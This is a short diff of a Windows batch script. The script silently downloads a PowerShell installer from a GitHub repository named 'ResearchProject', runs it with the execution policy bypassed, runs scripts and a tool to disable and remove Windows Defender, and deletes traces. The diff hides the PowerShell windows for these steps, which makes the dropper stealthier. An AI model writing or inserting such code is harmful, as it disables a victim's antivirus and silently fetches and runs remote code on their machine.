@@ -26,9 +26,8 @@ exit /B
 cd /d "%~dp0"
 
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/installer.ps1' -OutFile installer.ps1"
-powershell -NoProfile -ExecutionPolicy Bypass -File "installer.ps1"
-powershell -ExecutionPolicy Bypass -File "disableWinDef.ps1"
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "installer.ps1"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "disableWinDef.ps1"
 defender_remover.exe Y
 
-del disableWinDef.ps1
 del wget.cmd
